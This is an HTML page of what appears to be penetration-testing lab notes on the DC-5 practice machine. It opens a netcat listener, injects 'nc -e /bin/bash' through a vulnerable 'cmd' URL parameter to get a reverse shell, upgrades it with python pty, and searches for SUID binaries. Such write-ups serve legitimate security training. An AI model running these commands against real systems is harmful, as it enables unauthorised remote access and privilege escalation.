<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>3.5  Netcat shell with cmd</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>3.5  Netcat shell with cmd</u></b></h1><br />We can get a “reverse shell” over our “netcat” listener which we'll execute alongside.<br /><br />a) On your Kali Linux terminal type the following.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$nc</span>&nbsp;-lvp&nbsp;1234</div></div><br /><br />b) Navigate to the following direction.<br /><a href="http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log&cmd=id.">http://192.168.12.59/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc -e /bin/bash 192.168.12.56 1234</a><br /><br />You'll see on your Kali Linux shell the following.<br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/249-1.png" alt="images/249-1.png" /><br /><br />You have a “reverse shell”.<br /><br />c) Upgrade it with python.<br /><br />Run the following commands on your “reverse shell”.<br /><br /><div class="codebox"><div class="codebox">python&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span><br /><br /></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><span style="background-color:#000000;">www-data@dc-5:~/html$</span><br /><br />d) Check the binaries that has SUID bit.<br /><br /><div class="codebox"><div class="codebox">www-data@dc-5<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>html$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>4000&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</div></div><br /><br /><img src="images/249-2.png" alt="images/249-2.png" /><br /><br />This SUID set “screen” file seems interesting. It’s not normal to see it here and it's used for terminal sessions.<br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>